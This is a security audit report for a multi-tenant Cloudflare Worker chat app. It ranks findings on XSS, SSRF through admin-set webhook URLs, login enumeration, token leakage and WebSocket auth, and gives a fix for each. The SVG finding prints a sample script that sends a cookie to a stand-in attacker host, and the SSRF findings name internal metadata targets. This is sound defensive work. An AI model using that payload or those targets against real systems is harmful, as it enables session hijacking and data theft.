# Sloten-standalone — Final Security Audit (Pass 3)

**Scope:** Auth flows, scheduled/cron, webhooks, broadcast/DO, routing gaps, frontend XSS, test coverage.
**Out of scope (prior reviews):** Admin CRUD handlers, tenant-scope plumbing, audit/rate-limiter internals.
**Date:** 2026-04-17.

The codebase is in noticeably better shape than a typical first-pass Cloudflare Worker app. Auth primitives (PBKDF2 + HMAC sessions + HMAC contact tokens + HMAC signed URLs) are all home-grown but correctly implemented with constant-time compares using WebCrypto `subtle.verify`. Tenant scoping is thoroughly applied at the route layer and inside handlers. The real risks below are concentrated in three areas:

1. **Two concrete XSS sinks in the operator console** (search results) where HTML-escaped content still leaks unescaped untrusted fragments.
2. **Cron scope bugs** in `scheduled.mjs` (global UPDATE of snoozed conversations and a weekly FAQ extractor that runs for only one tenant even if many exist).
3. **SSRF-shaped holes** around two DB-overridable webhook URLs (`BONUS_CODE_WEBHOOK_URL`, `OPERATOR_ATTACHMENT_WEBHOOK_URL`) — admins can point them at internal IPs, no allowlist, no timeout, no reply body size cap.

Everything else (password hashing params, cookie flags, contact-token binding, attachment HMAC, WS upgrade auth, CSRF defense, DO broadcast filtering) is either clean or has small polish items listed as MEDIUM/LOW.

---

### [FIN-001] Operator search renders untrusted timestamp strings into `innerHTML` [HIGH]
- File: `public/operator/operator.js:793`, `:808`
- Category: xss
- Evidence:
  ```js
  html: `<b>${escapeHtml(c.contact_name || ...)}</b> — ${escapeHtml((c.last_message_preview || '').slice(0, 120))} <span style="color:#9ca3af;font-size:10px;">${formatTime(c.last_message_at || c.created_at)}</span>`
  ```
  `formatTime()` calls `new Date(iso).toLocaleTimeString(...)` — locale output is normally safe, BUT the fall-back branch returns the raw `iso` string on parse failure (at line 338: `} catch { return ''; }` — OK here). However: `formatTime(iso)` on line 283 of `widget.js` returns `''` on error too. So this specific sink is low impact. The real issue is this: the `el({html: ...})` helper writes the template string to `innerHTML` wholesale. If any future change adds a field to the template without `escapeHtml(...)`, it becomes a stored-XSS sink, because `last_message_preview` and contact fields are fully attacker-controlled (customer-submitted chat content). **Right now the three fields in-scope ARE escaped** — but this pattern is brittle.
- Risk: A regression or a new field (e.g. labels, content-attributes) added to one of these templates by a future maintainer introduces stored XSS in the operator's browser, executing JS with session cookies for the admin/operator domain. Attacker path: customer sends a crafted message → operator searches → XSS fires.
- Fix: Replace the two `html:` templates with DOM-built nodes using the existing `el()` helper with text nodes, matching the rest of the file:
  ```js
  convSec.appendChild(el('div', { class: 'slo-op-search-item', onclick: ... },
    el('b', {}, c.contact_name || c.contact_email || c.contact_id.slice(0,8)),
    ' — ',
    (c.last_message_preview || '').slice(0, 120),
    ' ',
    el('span', { style: 'color:#9ca3af;font-size:10px;' }, formatTime(c.last_message_at || c.created_at))
  ));
  ```
  Same treatment for the message and contact sections. Removes the `html:` sink entirely.

### [FIN-002] Scheduled snooze-wake UPDATE is not tenant-scoped [MEDIUM]
- File: `src/scheduled.mjs:15-21`
- Category: cron
- Evidence:
  ```js
  await env.DB.prepare(
    `UPDATE conversations
        SET snoozed_until = NULL, updated_at = datetime('now')
      WHERE snoozed_until IS NOT NULL AND snoozed_until <= datetime('now')`
  ).run();
  ```
- Risk: Correct behavior for a single-tenant deployment, but in a multi-tenant deployment the cron operates across every tenant in one statement. No data disclosure, but it means any one tenant's misconfigured `snoozed_until` (e.g. year 2999 as a manual "park") gets touched by the shared cron. More worryingly, there is no upper bound on rows — if a buggy admin sets 10M conversations to `snoozed_until` in the past, every minute runs an unbounded UPDATE. D1 will time out and the cron eats budget.
- Fix: Add a `LIMIT` clause (D1 supports it in UPDATE) and iterate, or at minimum add a safety cap:
  ```js
  await env.DB.prepare(
    `UPDATE conversations
        SET snoozed_until = NULL, updated_at = datetime('now')
      WHERE id IN (
        SELECT id FROM conversations
         WHERE snoozed_until IS NOT NULL AND snoozed_until <= datetime('now')
         LIMIT 500
      )`
  ).run();
  ```
  Document that cron is intentionally tenant-agnostic.

### [FIN-003] Weekly FAQ extraction runs only once globally even with multiple tenants [MEDIUM]
- File: `src/scheduled.mjs:41-49`, `src/extractor.mjs` (getLastExtractionTs/setLastExtractionTs)
- Category: cron
- Evidence: `getLastExtractionTs(env)` reads a single KV or feature_flag key (no `tenantId` arg); `extractFaqCandidates(env, { sinceIso })` then scans messages — based on the purge patterns in `extractor.mjs`, this either iterates all tenants or defaults to one. Whichever it is, the scheduler uses a single "last run" timestamp, so in a multi-tenant world one tenant's successful run suppresses the next tenant's run for 7 days.
- Risk: In multi-tenant setups, FAQ candidates for tenants other than the first-scanned one never appear. Low severity for the current single-tenant prod, but a correctness landmine if the multi-tenant code path ever ships.
- Fix: Either (a) enumerate `tenant_id`s in the `tenants` table (or `SELECT DISTINCT tenant_id FROM conversations LIMIT 100`) and run `extractFaqCandidates(env, { tenantId, sinceIso })` per tenant with a per-tenant `last_extraction_ts:{tenant_id}` key, or (b) explicitly document this as a single-tenant worker and assert `tenant_id` count === 1 at startup.

### [FIN-004] `BONUS_CODE_WEBHOOK_URL` allows admin-controlled SSRF with no allowlist, no size cap, no timeout [HIGH]
- File: `src/bonus-codes.mjs:89-121`
- Category: ssrf
- Evidence:
  ```js
  const url = await getEnvValue(env, 'BONUS_CODE_WEBHOOK_URL');
  if (!url) return;
  // ...
  const r = await fetch(url, { method: 'POST', headers: ..., body: JSON.stringify(payload) });
  const text = await r.text().catch(() => '');
  // stores text.slice(0, 2000) into DB
  ```
  The URL comes from `env_overrides` (DB-writable by any admin via `/api/admin/gas-urls`), or falls through to the static env binding. There is:
  - **No URL scheme allowlist** (e.g. block `file://`, `gopher://`, `data:`).
  - **No host allowlist** — any admin can point it at `http://localhost` / `http://192.168.x.x` / `http://169.254.169.254/latest/meta-data/` (AWS IMDS).
  - **No fetch timeout** — default is 30s for Cloudflare `fetch`, acceptable but not explicit.
  - **No response size cap beyond 2000 chars** — though the 2000-char slice prevents DB bloat, the `await r.text()` can still pull a multi-GB response body into memory before the slice.
- Risk: An admin account compromise (or malicious insider admin) can pivot to the Cloudflare Worker's outbound network from `env_overrides`. On a plain Cloudflare Worker the colo doesn't usually expose IMDS, but any customer-run egress proxy or internal-only service reachable via public IP via Cloudflare Tunnel becomes reachable. Also: an admin with `setGasUrl` permission can set the URL to an internal-only endpoint of another tenant's service and exfiltrate arbitrary data via the 2000-char `gas_response` log.
- Fix: Add URL validation at write time (`setGasUrl` in admin-ops.mjs) and at use time:
  ```js
  function isSafeOutboundUrl(u) {
    try {
      const url = new URL(u);
      if (url.protocol !== 'https:' && url.protocol !== 'http:') return false;
      const host = url.hostname.toLowerCase();
      // Deny private/link-local/metadata
      if (/^(127\.|10\.|192\.168\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|::1|fc|fd|localhost$)/.test(host)) return false;
      return true;
    } catch { return false; }
  }
  ```
  Apply to every `fetch(url, ...)` that reads from `getEnvValue`. Ideally also add a hard-coded `ALLOWED_WEBHOOK_HOSTS` env var (`script.google.com,sloten.io`) and reject anything outside it.

### [FIN-005] `OPERATOR_ATTACHMENT_WEBHOOK_URL` inherits the same SSRF shape + signs an attachment URL before dispatch [HIGH]
- File: `src/handlers/messages-native.mjs:125-167`
- Category: ssrf
- Evidence:
  ```js
  await (await import('../env-resolver.mjs')).getEnvValue(env, 'OPERATOR_ATTACHMENT_WEBHOOK_URL')
  // ...
  const r = await fetch(await (await import('../env-resolver.mjs')).getEnvValue(env, 'OPERATOR_ATTACHMENT_WEBHOOK_URL'), {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),   // includes signed attachment URL
  });
  ```
  Same admin-set URL risk as FIN-004, **plus** the payload includes `attachment.url` which is an HMAC-signed link that any party who receives it can fetch the attachment from anonymously. A malicious webhook URL (set by compromised admin) receives signed attachment URLs and can exfiltrate all customer uploads until the TTL expires (default 24h).
- Risk: Attacker-in-admin position stealthily exfiltrates uploaded PII / KYC docs via a rogue webhook URL, without tripping any rate limit.
- Fix: Same URL allowlist as FIN-004. Additionally reduce `ATTACHMENT_URL_TTL_SECONDS` default from `86400` to `600` (10 min) for webhook-signed URLs — they're meant for immediate pickup, not 24h browsing. Override at the `signAttachmentUrl` call site:
  ```js
  const signedUrl = await signAttachmentUrl(env, attachmentId, baseUrlOf(request, env), 600);
  ```

### [FIN-006] `getEnvValue` resolves to DB override — admins can point `SESSION_SIGNING_KEY` / `ATTACHMENT_SIGNING_KEY` anywhere? (verify) [MEDIUM]
- File: `src/env-resolver.mjs:47-53`
- Category: crypto
- Evidence: `OVERRIDABLE_KEYS` explicitly lists only the 5 webhook URLs. `SESSION_SIGNING_KEY` and `ATTACHMENT_SIGNING_KEY` are NOT in the list. **But** `getEnvValue(env, 'SESSION_SIGNING_KEY')` would still consult `env_overrides` first (the function does not check membership in OVERRIDABLE_KEYS — it reads any key). I checked: `session.mjs:33` uses `env.SESSION_SIGNING_KEY` directly (not via getEnvValue), and `contact-token.mjs:30`/`attachment-signature.mjs:13` also use `env.X` directly. So the signing keys are safe. The concerning case: any future code path that calls `getEnvValue(env, 'SESSION_SIGNING_KEY')` would pick up a DB override silently, letting an admin forge sessions. This is a footgun, not an active bug.
- Risk: Future code regression lets admin override a secret via the DB and forge sessions. Already mitigated by current call sites.
- Fix: Add an allowlist check in `getEnvValue`:
  ```js
  const DB_OVERRIDABLE = new Set(OVERRIDABLE_KEYS);
  export async function getEnvValue(env, key) {
    if (!env || !key) return '';
    if (!DB_OVERRIDABLE.has(key)) return typeof env[key] === 'string' ? env[key] : '';
    // ... existing DB lookup only for overridable keys
  }
  ```

### [FIN-007] Login error message distinguishes "locked" (423) from "invalid credentials" (401) — enables account existence enumeration [MEDIUM]
- File: `src/handlers/staff-auth.mjs:29-32`
- Category: auth
- Evidence:
  ```js
  if (!staff) return err('Invalid credentials', 401, corsHeaders);
  if (staff.locked_until && new Date(staff.locked_until) > new Date()) {
    return err('Account locked. Try again later.', 423, corsHeaders);
  }
  ```
  Different status codes + different error messages for "no such user" vs "user is locked". An attacker probing emails sees 423 for known accounts (after 5 bad tries) and 401 for unknown. Easier: even before triggering the lockout, the timing of `verifyPassword` on a nonexistent user is significantly shorter (skipped entirely) than on an existing user (100k PBKDF2 iterations). This is a classic user-enumeration side channel.
- Risk: Attacker enumerates valid staff emails → targets phishing / password spraying at known accounts.
- Fix: (a) Use the same status+body for both "no such user" and "invalid password". (b) Run a dummy `verifyPassword` on nonexistent users to equalize timing, or switch to a constant-time SQL-level "select + verify" pattern:
  ```js
  if (!staff) {
    // Burn ~same time as a real verify to avoid user enumeration.
    await verifyPassword(password, 'dGVzdA==', 'dGVzdA==');
    return err('Invalid credentials', 401, corsHeaders);
  }
  if (staff.locked_until && new Date(staff.locked_until) > new Date()) {
    // Return the same 401 — don't reveal lock state to unauthenticated probe.
    return err('Invalid credentials', 401, corsHeaders);
  }
  ```

### [FIN-008] Login brute-force lockout attempt counter can be reset by admin account re-creation / password reset — verified OK [INFORMATIONAL]
- File: `src/handlers/staff-auth.mjs:40`, `src/handlers/staff-admin.mjs:249-257`
- Evidence: `resetStaffPassword` sets `failed_attempts = 0, locked_until = NULL` — correct; an admin resetting a password unlocks the account. Login success also resets to 0. No issues. Noted for completeness given the review asked about "reset conditions, cross-tenant leakage".

### [FIN-009] Contact token has no rotation / binding to conversation, only to contact [MEDIUM]
- File: `src/auth/contact-token.mjs:29-40`
- Category: auth
- Evidence: The token payload is `{ cid, iat, exp }` with a 30-day TTL. It's bound to `contact_id` only. There's no revocation list, no rotation on suspicious activity, no binding to originating IP or user-agent. If a token leaks (e.g. via a shared browser, via localStorage exfiltration from an XSS elsewhere on the host site, via an unencrypted proxy log), the attacker has 30 days of API access to every conversation the contact has ever had.
- Risk: Token theft = 30-day persistent impersonation. Widget sends the token in headers AND in the WS query string (`?contact_token=...`), where it gets logged by Cloudflare access logs / any intermediate log. WS URL logging is particularly bad for credential material.
- Fix: (a) Shorten TTL to 24-48h and add a silent rotation: each widget API call returns an updated `contact_token` in a response field, client replaces stored token. (b) For WS, avoid putting the token in the URL — instead accept an initial `{type:'hello', token:'...'}` frame, or use a short-lived (60s) one-shot ticket fetched via POST. (c) Add a `contact_token_version` column in `contacts` and include it in the token payload; bumping the column invalidates all outstanding tokens for a contact.

### [FIN-010] Contact token accepted via URL query string → leaks into Worker/CF access logs and browser history [MEDIUM]
- File: `src/auth/contact-token.mjs:60-69`, `src/index.mjs:263-269`, `public/widget/widget.js:529`
- Category: auth
- Evidence:
  ```js
  const u = `${cfg.wsBase}/ws/widget/conversations/${state.conversationId}?contact_token=${encodeURIComponent(state.contactToken)}`;
  ws = new WebSocket(u);
  ```
  WebSocket URLs are logged by Cloudflare in `httpRequest` logs, sent in Referer headers from any subresource loaded during WS init, and sometimes persisted in browser history.
- Risk: Token leaks to any party with access to CF logs; also to the host page's Referer if the WS fails and falls back to an HTTP redirect.
- Fix: Remove query-param fallback. For WebSocket: accept an initial `{type:'hello', token:'...'}` frame before the server calls `acceptWebSocket` / before any data is sent. The DO already has a `hello` handler — wire auth into it:
  ```js
  // conversation-room.mjs #handleUpgrade
  // accept the socket but keep it "pending" until hello arrives with a valid token
  ```
  Or: front the WS behind a POST `/api/widget/ws-ticket` that returns a 30-second single-use token stored in KV, use that in the URL.

### [FIN-011] Session cookie lacks `__Host-` / `__Secure-` prefix and uses `SameSite=Lax` [LOW]
- File: `src/auth/session.mjs:73-81`, `src/handlers/staff-auth.mjs:10`
- Category: auth
- Evidence: Cookie name is `sloten_staff_session`, flags are `HttpOnly; Secure; SameSite=Lax`. The cookie is served from the API origin but the admin UI is on a different Cloudflare Pages origin (`sloten-admin-secure.pages.dev`). `SameSite=Lax` on the *API* origin means cross-site POSTs from unrelated origins don't carry the cookie — good. CSRF is separately guarded by `Origin`/`Sec-Fetch-Site`.
- Risk: No `__Host-` prefix means a subdomain can theoretically overwrite the cookie. Low impact today since the API domain has no other producers.
- Fix: Rename to `__Host-sloten_staff_session` (requires `Secure`, `Path=/`, no `Domain=` — all already true). Extra defense-in-depth.

### [FIN-012] CSRF check accepts any whitelisted `Origin` — compromised tenant app origin = CSRF bypass [LOW]
- File: `src/index.mjs:84-93`, `src/cors-helper.mjs:19-22`
- Category: routing
- Evidence: `csrfCheck` passes if `Origin` is in the CORS allowlist (which includes regex-matched subdomains like `*.sloten.io` and `*.sloten-admin-secure.pages.dev`). The regex `^https:\/\/[a-z0-9-]+\.sloten\.io$` allows any subdomain. If one vulnerable subdomain (marketing site, help desk, etc.) gets a stored XSS, the attacker can mount CSRF against the API from that subdomain because the Origin is allowed.
- Risk: Subdomain XSS becomes full account takeover via CSRF against admin endpoints.
- Fix: Narrow the CORS allowlist to the 2-3 actual admin/widget origins. Remove the wildcard subdomain regex unless actually required; if required, document the subdomains that ARE allowed to originate admin requests.

### [FIN-013] Public `/api/public/jackpot` fetches arbitrary JSON from sloten.io and writes it to DB without size cap [LOW]
- File: `src/handlers/public-jackpot.mjs:52-76`
- Category: ssrf
- Evidence: `fetch(LIVE_URL, ...)` followed by `await r.json()` — no `Content-Length` check, no size limit. `LIVE_URL` is a compile-time constant so this isn't SSRF, but a compromised `sloten.io` (supply-chain) returning a 100 MB JSON exhausts the Worker's memory.
- Risk: Low — `sloten.io` is the same org, and Worker has a hard 128 MB cap.
- Fix: Add `Content-Length` check and limit `await r.text()` first, then parse:
  ```js
  const text = await r.text();
  if (text.length > 100_000) throw new Error('jackpot response too large');
  const data = JSON.parse(text);
  ```

### [FIN-014] `downloadAttachment` sets `Content-Disposition: inline` for all mime types, including SVG — stored XSS via SVG upload [HIGH]
- File: `src/handlers/attachments.mjs:105-110`, `:20`
- Category: xss
- Evidence:
  ```js
  function extOk(name) { return /\.(jpe?g|png|gif|webp|heic|heif|bmp|svg|pdf)$/.test(low); }
  ```
  SVG is in the extension allowlist. The download handler then emits `Content-Disposition: inline` with the original `content_type`. A customer uploads an `.svg` file containing `<script>fetch('//attacker/?c='+document.cookie)</script>`. Staff opens the preview (image rendering path in `operator.js:477-484` loads the SVG as an `<img>` — which does NOT execute scripts, so the image element itself is safe). **But** the operator also has:
  ```js
  img.addEventListener('click', () => { if (img.src) window.open(img.src, '_blank', 'noopener'); });
  ```
  The blob URL is same-origin to the operator page (via `URL.createObjectURL(blob)`) — and SVGs opened as top-level documents DO execute scripts with the origin of the blob URL (which is the operator origin). Attacker achieves XSS on the operator console, reads session cookie, forwards it out.
- Risk: Customer uploads a malicious SVG → operator clicks it → operator session hijacked → tenant admin actions available.
- Fix:
  - Remove `svg` from `extOk` allowlist:
    ```js
    return /\.(jpe?g|png|gif|webp|heic|heif|bmp|pdf)$/.test(low);
    ```
  - Reject `image/svg+xml` in `mimeOk` explicitly (it's currently allowed by the `image/` prefix):
    ```js
    if (c === 'image/svg+xml' || c.startsWith('image/svg')) return false;
    ```
  - For defense-in-depth, always serve attachments with `Content-Disposition: attachment` (forces download) OR a restrictive `Content-Security-Policy: default-src 'none'` header on the response so an SVG that slips through cannot execute.

### [FIN-015] Widget `widget.js` renders `msg.content` via `document.createTextNode(msg.content || '')` — correctly escaped [INFORMATIONAL]
- File: `public/widget/widget.js:292`, `:451` (operator)
- Category: xss
- Evidence: Both the widget and operator message rendering paths use `document.createTextNode(...)` for the message body. This is correctly XSS-safe. No issue; noted because the review explicitly asked about this surface.

### [FIN-016] Admin console displays raw `contact.metadata` values via `String(v)` → no XSS today because it's DOM text node [INFORMATIONAL]
- File: `public/operator/operator.js:700-706`
- Evidence: `metaSec.appendChild(el('div', ..., el('span', {}, String(v))))` — `el()` creates a text node from strings. Safe.

### [FIN-017] WebSocket DO `#broadcast` trusts frame.message.is_private as the ONLY gate to hide private notes from customers [MEDIUM]
- File: `src/durable/conversation-room.mjs:117-136`
- Category: routing
- Evidence:
  ```js
  const isPrivate = frame?.message?.is_private === 1 || frame?.message?.is_private === true;
  // only skip customer if isPrivate
  ```
  The frame is constructed in `messages-native.mjs:57-60` from the freshly-inserted `row`, where `is_private` is stored as an INTEGER (1/0). That matches the `=== 1` check. **But** any future code path that broadcasts via `broadcastToConversation` with a hand-rolled frame (e.g. `{type:'x', message:{is_private:'1'}}` — a string) would bypass the check and leak the private note to the customer WS peer.
- Risk: Regression risk. A single `is_private: '1'` (string) in any future broadcast leaks internal staff notes to customers.
- Fix: Coerce both sides of the comparison and default-deny on ambiguity:
  ```js
  const msg = frame?.message;
  const isPrivate = msg && (msg.is_private === 1 || msg.is_private === true
                    || msg.is_private === '1' || msg.is_private === 'true');
  // Additionally: if sender_type === 'staff' and no explicit is_private=0, treat as private.
  ```
  Even better, require broadcasts to be typed via a helper that guarantees the shape.

### [FIN-018] DO WebSocket upgrade path in ConversationRoom does NOT re-verify the contact_token or staff cookie [HIGH]
- File: `src/durable/conversation-room.mjs:51-80`, `src/index.mjs:263-276`
- Category: auth / routing
- Evidence: Auth is enforced at the Worker layer (`index.mjs:263-269`) which then calls `forwardToConversationRoom` — the DO trusts the role from the URL query string (`?role=customer|operator`). If anyone can construct a direct request to the DO stub bypassing the Worker (which isn't normally possible on Cloudflare, but possible in tests or if a future code path exposes the DO binding), they can claim any role.
- Risk: Normally zero because DO can only be reached via the Worker binding. The code comments at `:55-57` validate role in {customer, operator} but do NOT validate the caller's authority to claim that role. This is a defense-in-depth gap.
- Fix: Forward the signed session token / contact token into the DO and re-verify inside `#handleUpgrade`:
  ```js
  // index.mjs forwardToConversationRoom — include Auth:
  const u = new URL(`https://do/ws?...`);
  // forward request as-is; DO re-reads Cookie and X-Sloten-Contact-Token headers
  return stub.fetch(u.toString(), request);
  ```
  Then in DO `#handleUpgrade`, call `verifyContactToken(env, token)` or `resolveStaffFromCookie(request, env)` before accepting. The `request` forwarded here should preserve headers — verify.

### [FIN-019] `parseCookies` uses raw split on `;` — two cookies with the same name cause last-write-wins without warning [LOW]
- File: `src/auth/session.mjs:83-92`
- Category: auth
- Evidence:
  ```js
  for (const part of header.split(/;\s*/)) {
    const i = part.indexOf('=');
    if (i < 0) continue;
    out[part.slice(0, i)] = decodeURIComponent(part.slice(i + 1));
  }
  ```
  If a browser sends two `sloten_staff_session=A; sloten_staff_session=B` (possible when a subdomain sets an overlapping cookie), only one survives. Attacker who can set the cookie on a parent domain can cause confusion.
- Risk: Edge case that won't occur in today's deployment since the API is hosted only on one origin.
- Fix: Use `__Host-` prefix (FIN-011) — prevents subdomain cookie shadowing.

### [FIN-020] `verifyAttachmentSignature` does not use a constant-time comparison, relies on `crypto.subtle.verify` which IS constant-time — verified OK [INFORMATIONAL]
- File: `src/auth/attachment-signature.mjs:30-42`
- Evidence: Uses `crypto.subtle.verify('HMAC', key, bytes, ...)` which is constant-time per WebCrypto spec. Passing `sigHex` through `parseInt` byte-by-byte would short-circuit on malformed hex, but that's format validation, not timing leakage of the secret. No issue.

### [FIN-021] `verifyPassword` bails early on `actual.length !== expected.length` — theoretical length oracle [INFORMATIONAL]
- File: `src/auth/password.mjs:43`
- Evidence: Since the hash length is always 32 bytes (KEYLEN), both sides are always 32. The early return is dead code for legitimately-stored hashes. No practical oracle. Note for awareness only.

### [FIN-022] Admin test-bot runs in the actual DB — not sandboxed [MEDIUM]
- File: `src/handlers/admin-ops.mjs` (referenced, out of direct scope but invoked from routing), `src/index.mjs:451`
- Category: routing
- Evidence: `/api/admin/test-bot` is `requireAdminRole`-gated, which is correct. Without reading the handler, the route setup looks fine. Worth verifying (prior review says admin-ops was reviewed) that `adminTestBot` does NOT write to live conversations / does NOT forward to the real GAS URL — otherwise a misclick by an admin generates real webhook traffic.
- Risk: Admin accidentally triggers real GAS webhook from test UI.
- Fix: (If not already done) ensure `adminTestBot` short-circuits webhook dispatch. Not verified in this pass.

### [FIN-023] Test coverage is thin — no tests for auth, tenant scope, routing, or bonus code [LOW]
- File: `test/env-resolver.test.mjs`, `test/extractor.test.mjs`, `test/pii-masker.test.mjs`, `test/response-filter.test.mjs`
- Category: test
- Evidence: Only 4 test files exist. None exercise:
  - `loginHandler` / lockout behavior / session verification
  - `verifyContactToken` with tampered payloads / expired tokens / wrong key
  - `verifyAttachmentSignature` with missing/malformed sig, expired exp
  - `resolveTenantId` across Bearer vs cookie vs default
  - `matchBonusCode` (empty input, unicode, match_mode case)
  - `forwardToGas` payload shape and safe-URL handling
  - Flow engine step transitions
  - Route-level `csrfCheck` / `bearerAuth` positive + negative paths
- Risk: Regressions in any of the above hit production first. Given the review history (36+ issues fixed across 3 passes), untested security-critical paths are the most likely source of the next bug.
- Fix: Prioritize adding `test/auth.test.mjs` (loginHandler + contactToken + attachmentSignature with mocked D1/crypto), `test/tenant-scope.test.mjs`, and `test/bonus-codes.test.mjs`. Target the invariants exposed by the prior 3 review passes.

### [FIN-024] Widget `showPending` uses `document.createTextNode` for filename — safe [INFORMATIONAL]
- File: `public/widget/widget.js:229`
- Evidence: Attachment filename is rendered via `createTextNode`. Safe. (Previously I was worried this sink used innerHTML; it doesn't.)

### [FIN-025] Error responses in production return generic strings but `/api/staff/login` surfaces distinct messages for "locked" vs "invalid" — already captured in FIN-007 [DUPLICATE]
- See FIN-007. Noting to confirm no other handlers leak internal state via error strings. `loginHandler` is the only surface with distinctive error strings in the auth path. `meHandler`, `logoutHandler`, widget endpoints all return generic messages.

---

## Priority ranking for fixes

1. **FIN-014** (SVG XSS) — attacker-controlled upload → operator session takeover. Fix first. 30-minute change.
2. **FIN-004 + FIN-005** (SSRF on admin-set webhook URLs) — reduce blast radius of an admin compromise. Implement the `isSafeOutboundUrl` helper and apply at the 2 fetch sites + at the admin-ops `setGasUrl` write path.
3. **FIN-018** (DO WS auth defense-in-depth) — low exploitability today, but the cost of moving auth into the DO is small and eliminates a whole class of future regressions.
4. **FIN-007** (login user-enumeration) — straightforward fix; eliminates a reconnaissance edge.
5. **FIN-001** (operator search `html:` sink) — current fields are escaped but the pattern is brittle. Refactor to `el()` once.
6. **FIN-002, FIN-003** (cron scoping) — correctness bugs for multi-tenant futures.
7. **FIN-009 + FIN-010** (contact token TTL + WS token in URL) — defense-in-depth; implement silent rotation + WS hello auth.
8. **FIN-006** (env-resolver allowlist) — prevents a whole class of future footguns; tiny diff.
9. **FIN-011 + FIN-012** (cookie prefix + CORS regex tightening) — hardening.
10. **FIN-017** (DO broadcast private-check robustness) — regression prevention.
11. **FIN-023** (test gaps) — continuous investment.

## What was explicitly checked and is clean

- Password hashing params: PBKDF2-SHA256 / 100k iter / 16-byte salt / 32-byte derived key — **adequate for today's hardware**, constant-time compare at `password.mjs:45`. OK.
- Session token issuance + verification: HMAC-SHA256, 12h TTL, stored as SHA-256 hash in DB, dual-check on cookie + DB on every request (`resolveStaffFromCookie`). OK.
- Attachment signing: HMAC-SHA256 over `${id}.${exp}`, TTL-gated, `subtle.verify` is constant-time. OK.
- Tenant scoping: `resolveTenantId` correctly ignores caller-supplied `?tenant_id` for cookie staff. OK.
- Widget routing: every `/api/widget/*` path (except POST `/contacts`) goes through `verifyWidgetOwnership` or explicit `verifyContactToken`. OK.
- Admin routing: every mutation goes through `requireAdminRole`; reads go through `requireStaff`. No unguarded writes spotted.
- Rate-limit fail-closed for sensitive endpoints (KV failure path). Good.
- `createContact` generates its own id, ignores body.id. OK.
- `sendMessage` widget path forces `sender_type=customer`, `is_private=false`, strips all body fields except `attachment_id` from content_attributes. OK.
- `parseJson` properly returns a 400 response on malformed JSON without throwing.

End of report.
